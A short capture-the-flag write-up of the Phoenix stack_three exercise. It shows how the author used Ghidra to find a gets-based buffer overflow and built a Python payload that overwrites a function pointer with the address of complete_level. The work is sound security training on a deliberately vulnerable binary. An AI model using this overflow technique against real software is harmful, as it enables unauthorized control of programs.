---
title: Phoenix - stack_three, NCS
date: 2026-06-26 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix stack_three challenge
toc: true
---


## Introduction
I will be explaining how i did the challenge stack_three from the series Phoenix found at <https://exploit.education/phoenix/stack-three/> but without referencing the source code this time. 

## Disassembling it
Firstly, i loaded the binary `stack-three.elf` using Ghidra, followed by jumping to the starting function and selecting graph view. 

![](assets/posts/PWN/phoenix_stack_three_ncs/fg.png)


Based on the disassembled and decompiled code, the usage of __gets__ suggests that a buffer overflow is to be used here. Via the listing view in ghidra, i can also see that another function __complete_level__ is present as shown below.

![](assets/posts/PWN/phoenix_stack_three_ncs/hint1.png)

This suggests that i am supposed to have the address of the function as the overflowed value which is further supported by the text present in the decompiled code as shown below:

![](assets/posts/PWN/phoenix_stack_three_ncs/hint2.png)

## Testing out my payload
As the variable `local_54` is 64 bytes, i will be filling it with 64 letter A. This is followed by a string of 4 letter B. This is to determine where to place the memory address. 

```
import sys
changeme = b"A"*64
changeme += b"bbbbcccceeeedddd"
sys.stdout.buffer.write(changeme)
```

When running the binary with the output from the script above, it displayed the following output:

![](assets/posts/PWN/phoenix_stack_three_ncs/output1.png)

When viewing the stack, i can see that this is the values of `bbbb` which means that i should place the memory address right after the initial 64 bytes. 

![](assets/posts/PWN/phoenix_stack_three_ncs/stack.png)

## Finalising my payload
My final payload is shown below with the target memory address being right after the initial bytes which will cause the function __complete_level__ to be called. 


```
import sys
changeme = b"A"*64
changeme += b"\xbd\x61\x55\x56"
sys.stdout.buffer.write(changeme)
```

This successfully completes this challenge as shown below.

![](assets/posts/PWN/phoenix_stack_three_ncs/flag.png)




